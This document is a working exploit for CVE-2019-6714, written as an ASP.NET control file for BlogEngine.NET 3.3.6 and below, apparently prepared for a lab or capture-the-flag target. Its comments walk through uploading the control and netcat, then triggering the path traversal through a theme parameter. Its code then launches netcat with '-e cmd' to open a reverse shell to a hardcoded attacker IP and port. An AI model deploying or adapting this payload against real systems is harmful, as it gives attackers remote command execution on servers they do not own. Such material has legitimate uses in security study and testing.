<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">

/*
 * CVE-2019-6714
 *
 * Path traversal vulnerability leading to remote code execution.  This
 * vulnerability affects BlogEngine.NET versions 3.3.6 and below.  This
 * is caused by an unchecked "theme" parameter that is used to override
 * the default theme for rendering blog pages.  The vulnerable code can
 * be seen in this file:
 *
 * /Custom/Controls/PostList.ascx.cs
 *
 * Attack:
 *
 * First, we set the address and port within the method below to
 * our attack host, who has a reverse tcp listener waiting for a connection.
 * Next, we upload this file through the uploader file manager.  In the current (3.3.6)
 * version of BlogEngine, this is done by editing a post and clicking on the
 * icon that looks like an open file in the toolbar.  Note that this file must
 * be uploaded as: 
 * PostView.ascx
 *
 * Once uploaded, the file will be in the
 * /App_Data/files directory off of the document root. Perform the same action to upload netcat for windows.
 * You can download it from here: https://github.com/int0x33/nc.exe/raw/master/nc64.exe
 * Upload nc using the same procedure, the file must be named nc64.exe, then on the server the file will be saved on the following path:
 * C:\\inetpub\\wwwroot\\app_data\\files\\nc64.exe
 * eventaully you can change this this path on line 50
 *
 * Finally, the vulnerability is triggered by accessing the base URL for the
 * blog with a theme override specified like so:
 *
 * http(s)://<vulnerable Server IP>/?theme=../../App_Data/files
 *
 */

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

	// CHANGES THIS PARAMETER ///
	var atck_IP = "10.9.0.174";
	var atck_Port = "1234";
	/////////////////////////////
	
	
	var path_2_nc = "C:\\inetpub\\wwwroot\\app_data\\files\\nc64.exe";
	
	if (System.IO.File.Exists(path_2_nc)){
	
		//Response.Write("nc exists");
		System.Diagnostics.Process p = new System.Diagnostics.Process();
		p.StartInfo.FileName = "C:\\Windows\\system32\\cmd.exe";
		p.StartInfo.Arguments = "/C " + path_2_nc + " " + atck_IP + " " + atck_Port + " -e cmd";
		p.Start();
	
	
	}
				
}
  

</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
